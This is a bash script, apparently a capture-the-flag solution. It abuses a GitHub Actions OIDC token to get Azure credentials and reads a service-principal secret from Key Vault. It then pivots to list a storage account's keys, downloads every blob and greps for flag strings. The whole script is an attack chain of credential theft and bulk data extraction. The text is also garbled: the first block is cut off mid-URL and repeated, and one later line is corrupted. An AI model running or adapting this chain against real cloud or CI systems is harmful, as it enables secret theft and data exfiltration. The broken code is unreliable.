#!/usr/bin/env bash
set -uo pipefail
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
ACCT=sttblcilogsprodx3euoz
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
exch(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "scope=$1" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" | jq -r '.access_token // empty'; }
spt(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$1" -d "client_secret=$2" -d "scope=$3" -d "grant_type=client_credentials" | jq -r '.access_token // empty'; }
KV=$(exch "https://vault.azure.net/.default")
J=$(curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4" | jq -r '.value')
ARM=$(spt "$(echo "$J"|jq -r .appId)" "$(echo "$J"|jq -r .clientSecret)" "https://manage
set -uo pipefail
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
ACCT=sttblcilogsprodx3euoz
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
exch(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "scope=$1" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" | jq -r '.access_token // empty'; }
spt(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$1" -d "client_secret=$2" -d "scope=$3" -d "grant_type=client_credentials" | jq -r '.access_token // empty'; }
KV=$(exch "https://vault.azure.net/.default")
J=$(curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4" | jq -r '.value')
ARM=$(spt "$(echo "$J"|jq -r .appId)" "$(echo "$J"|jq -r .clientSecret)" "https://management.azure.com/.default")
RID=$(curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | jq -r ".value[]|select(.name==\"$ACCT\")|.id")
K=$(curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "https://management.azure.com$RID/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value')

for c in $(az storage container list --account-name "$ACCT" --account-key "$K" --query '[].name' -o tsv --only-show-errors); do
  for b in $(az storage blob list --account-name "$ACCT" --account-key "$K" -c "$c" --query '[].name' -o tsv --only-show-errors); do
    az storage blob download --account-name "$ACCT" --account-key "$K" -c "$c" -n "$b" -f /tmp/b --no-progress --only-show-errors >/dev/null 2>&1
    sz=$(wc -c </tmp/b)
    echo "===== $c/$b ($sz bytes) ====="
    if file /tmp/b | grep -qiE 'zip|archive'; then
      rm -rf /tmp/un; mkdir -p /tmp/un; (cd /tmp/un && unzip -o /tmp/b >/dev/null 2>&1)
      find /tmp/un -type f | while read -r u; do echo "  [zip] ${u#/tmp/un/} ($(wc -c <"cho; done
    else
      head -c 1200 /tmp/b; echo
    fi
  done
done
echo "===== grep rong ====="; grep -raiE 'flag|CJ\{|tbl\{|cyberjutsu' /tmp 2>/dev/null | grep -v '/proc/' | head -20
echo DONE
